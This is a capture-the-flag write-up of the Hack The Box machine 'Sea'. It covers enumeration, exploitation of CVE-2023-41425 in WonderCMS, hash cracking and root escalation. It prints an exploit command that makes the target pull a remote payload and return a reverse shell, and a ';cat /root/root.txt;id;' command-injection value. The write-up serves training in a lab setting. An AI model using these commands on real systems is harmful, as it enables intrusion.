---
categories:
- write-up
- Linux
- Easy
date: "2025-01-22T00:00:00Z"
title: Sea - Hack The Box
toc: true
displayUpdatedDate: true
enableInlineShortcodes: true
layout: list
---

![](/assets/images/HTB/Sea/sea%20LOGO.png)



Sea is an Easy-rated Linux machine on Hack The Box that requires thorough web enumeration to uncover hidden directories and identify a vulnerable theme. Exploiting CVE-2023-41425 allows for remote code execution, leading to an initial foothold. A hashed password found in a database file is cracked to gain SSH access as a user. Privilege escalation is achieved by tunneling into a locally hosted service, leveraging access logs to execute commands as root.

{{< callout type="info" >}}
  Tags:

{{% details title="show tags"  closed="true" %}}

- fuzzing
- sub-directories
- wonder-CMS
- CMS
- CVE-2023-41425
- XSS
- RCE
- hash-cracking
- hashcat
- BurpSuite
- command-injection

{{% /details %}}
{{< /callout >}}

## Enumeration.
- **IP:** 10.10.11.28
- **Environment:** Linux

### Port Scan.
To begin, I conducted an initial enumeration using *nmap*:

```bash
sudo nmap -sS -sV -sC -p22,80 -Pn -n -vvv 10.129.109.135 -oA nmap/allPorts
```

```java 
# Nmap 7.94SVN scan initiated Tue Aug 13 14:42:56 2024 as: nmap -sS -sV -sC -p22,80 -Pn -n -vvv -oA nmap/allPorts 10.129.109.135
Nmap scan report for 10.129.109.135
Host is up, received user-set (0.12s latency).
Scanned at 2024-08-13 14:42:57 EDT for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sea - Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 13 14:43:09 2024 -- 1 IP address (1 host up) scanned in 13.43 seconds
```

The scan revealed two open ports:

- **22/tcp** 
- **80/tcp**

#### Host Discovery.
Visiting the web page on port 80 revealed a hostname in a redirect link: `sea.htb`. This was added to `/etc/hosts`:

![Alt Text](/assets/images/HTB/Sea/sea1.png)

```plaintext
10.10.11.28  sea.htb
```


### Fuzzing the target.
#### Identifying folders.
I began fuzzing the web server to identify directories using *ffuf*. After getting results I was able to identify some directories that were giving back status code 301 (forbidden).

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://sea.htb/FUZZ -c -fc 403
```

![Alt Text](/assets/images/HTB/Sea/sea2.png)

## Foothold.

### Targeted fuzzing.
I tried to uncover hidden content by looking for files/folders *within specific folders*. The idea was to fuzz deeper into the directory structure, targeting areas that might not have the same level of protection or redirection rules. By isolating and testing these subdirectories.
In this case I focused on the **themes** directory:

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://sea.htb/themes/FUZZ -c
```
![Alt Text](/assets/images/HTB/Sea/sea3.png)

After reviewing these results the folder *bike*, was the one that caught my attention (eventhough it was giving 301 status). I decided to keep enumetating, fuzzing and digging deeper for more information.

![Alt Text](/assets/images/HTB/Sea/sea4.png)


Within `/themes/bike/`, I discovered a file called *version*. Accessing it revealed the software *Version: **3.2.0***.

- http://sea.htb/themes/bike/version

![Alt Text](/assets/images/HTB/Sea/sea5.png)

 Further exploration led to README.md, which provided details about the  software used by the site - **WonderCMS**.

![Alt Text](/assets/images/HTB/Sea/sea6.png) 

---

### Vulnerability Discovery
Researching the identified software version uncovered a critical vulnerability:

- **CVE-2023-41425** - *WonderCMS* Cross-Site Scripting (XSS) leading to Remote Code Execution (RCE)

This vulnerability affects **WonderCMS** versions **3.2.0 through 3.4.2**. The vulnerability lies in the installModule component of WonderCMS, where user inputs are not adequately sanitized before being processed.

To make the exploit work the attacker should either be authentificated or somehow make an authentificated usr to execute the code. In the case of the machine there ir a bot that triggers this action.

## Exploitation

Upon using a python exploit script from [GitHub](https://github.com/insomnia-jacob/CVE-2023-41425),the script required specifying the URL, attacker IP, attacker port, and the path to the payload zip file:

```bash
python3 exploit.py -u http://sea.htb/loginURL -i 10.10.14.4 -p 1234 -r http://10.10.14.4/main.zip
```

Once the payload was prepared, I used the website's contact form to deliver the malicious link to the admin, triggering the exploit.

![Alt Text](/assets/images/HTB/Sea/sea7.png)

![Alt Text](/assets/images/HTB/Sea/sea8.png)

 
## Privilege Escalation (Amay)

### Discovering the hash.
With a shell as www-data, I enumerated the filesystem and discovered a database file at */var/www/sea/data*, containing a hashed password:


![Alt Text](/assets/images/HTB/Sea/sea9.png)

```plaintext
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```
### Cracking the hash.
Using hashcat, I cracked the hash with the following command:

```bash
hashcat -m 3200 DB.hash /usr/share/wordlists/rockyou.txt --force
```
![Alt Text](/assets/images/HTB/Sea/sea10.png)

The password was successfully recovered. Using this credential, I logged in as the user **amay** via SSH.

```bash
ssh amay@10.129.109.135
```
![Alt Text](/assets/images/HTB/Sea/sea11.png)



## Privilege Escalation (Root)

### Local Service Discovery
As `amay`, I identified a service running on localhost at port 8080:

```bash
netstat -tunlp
```

To access it, I established local port forwarding:

```bash
ssh -D 8080  amay@10.129.109.135
```

Navigating to http://localhost:8080, I found a dashboard requiring credentials. The credentials for amay worked, granting access to the dashboard.

![Alt Text](/assets/images/HTB/Sea/sea12.png)

### Log File Exploitation
![Alt Text](/assets/images/HTB/Sea/sea13.png)

The dashboard provided access to logs, including *access.log* and *auth.log*.

![Alt Text](/assets/images/HTB/Sea/sea14.png)

By intercepting the request in Burp Suite, I injected a malicious command to read the `root.txt` flag:

```plaintext
;cat /root/root.txt;id;
```

Upon execution, I successfully retrieved the root flag and verified root access.

## Conclusion

This machine provided a comprehensive lesson in enumeration, vulnerability exploitation, and privilege escalation. Key takeaways include:

1. **Thorough Enumeration**: Always examine HTTP responses, directories, and server headers for clues.
2. **Research Known Vulnerabilities**: Identifying software versions and matching them to CVEs can expedite exploitation.
3. **Creative Exploitation**: Leveraging user interaction and local services is critical for advancing in restricted environments.

Happy hacking! Stay tuned for more write-ups.

